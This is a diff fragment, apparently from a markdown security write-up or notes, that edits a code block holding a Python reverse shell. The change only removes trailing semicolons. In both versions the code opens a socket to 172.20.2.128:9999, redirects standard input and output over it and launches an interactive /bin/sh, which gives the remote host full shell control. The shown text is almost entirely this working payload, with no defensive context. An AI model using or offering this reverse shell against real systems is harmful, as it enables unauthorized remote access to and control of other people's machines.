@@ -194,12 +194,12 @@ import subprocess
 import os
 ip="172.20.2.128"
 port=9999
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect((ip,port));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((ip,port))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 ```
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111041701182.png)
